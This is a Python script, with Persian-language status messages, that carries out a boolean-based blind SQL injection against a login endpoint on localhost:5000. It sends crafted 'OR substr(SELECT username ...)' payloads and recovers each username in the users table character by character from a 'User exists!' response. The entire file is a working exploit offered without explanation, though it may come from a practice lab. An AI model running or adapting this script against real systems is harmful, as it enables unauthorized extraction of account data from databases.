import requests
import string

URL = "http://localhost:5000/"
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-@.$"
MAX_LEN = 30

def check_condition(payload):
    data = {'username': payload}
    response = requests.post(URL, data=data)
    return "User exists!" in response.text

def extract_username(user_index=0):
    extracted = ""
    print(f"[*] استخراج یوزرنیم شماره {user_index}")
    for pos in range(1, MAX_LEN + 1):
        found = False
        for c in CHARSET:
            payload = f"' OR substr((SELECT username FROM users LIMIT {user_index},1),{pos},1)='{c}' -- "
            if check_condition(payload):
                extracted += c
                print(f"[+] {pos}: {c}")
                found = True
                break
        if not found:
            print(f"[!] پایان رشته در موقعیت {pos}")
            break
    return extracted

def dump_all_users(max_users=5):
    users = []
    for i in range(max_users):
        username = extract_username(i)
        if username:
            users.append(username)
        else:
            break
    print("\n🎉 یوزرهای استخراج‌شده:")
    for u in users:
        print(f"  ➤ {u}")
    return users

if __name__ == "__main__":
    dump_all_users()
